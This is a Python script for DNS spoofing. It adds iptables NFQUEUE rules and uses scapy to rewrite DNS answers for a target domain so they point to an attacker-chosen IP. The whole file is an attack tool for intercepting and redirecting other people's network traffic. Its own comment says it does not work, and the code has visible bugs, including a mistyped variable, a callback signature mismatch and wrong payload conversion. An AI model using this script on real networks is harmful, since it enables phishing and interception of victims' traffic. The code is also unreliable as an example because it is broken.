import netfilterqueue
import optparse
import subprocess
import scapy.all as scapy
import socket

"""Dont working! rewrite"""


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-e", "--enviroment", dest="env",
                      help="enviroment if vms - False, else - True")
    parser.add_option("-d", "--domain_name", dest="DomName",
                      help="domain name of website which ip changing")
    parser.add_option("-g", "--goal", dest="goal",
                      help="website or ip for redirect")
    parser.add_option("-t", "--type", dest="type", help="type -> ip |or| dn")

    (options, arguments) = parser.parse_args()

    return options


def env_set(env):

    if env == "False":
        subprocess.run(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
        subprocess.run(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    elif env == "True":
        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    else:
        print("[!] Wrong enviroment settings")


def get_hostname_ip(type, goal):
    if type == "ip":
        return goal
    elif type == "dn":
        return socket.gethostbyname(goal)


def fake_dns_responce(packet, DomName, goal):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        if DomName in qname:
            print(f"[+] Changing ip of {DomName}")
            answer = scapy.DNSRR(rrname=qname, rdata=goal)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy.packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


if __name__ == "__main__":

    options = get_arguments()
    hostname = options.DomName
    ip = get_hostname_ip(options.type, options.goal)

    env = options.env
    env_set(env)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(1, fake_dns_responce)
    queue.run()

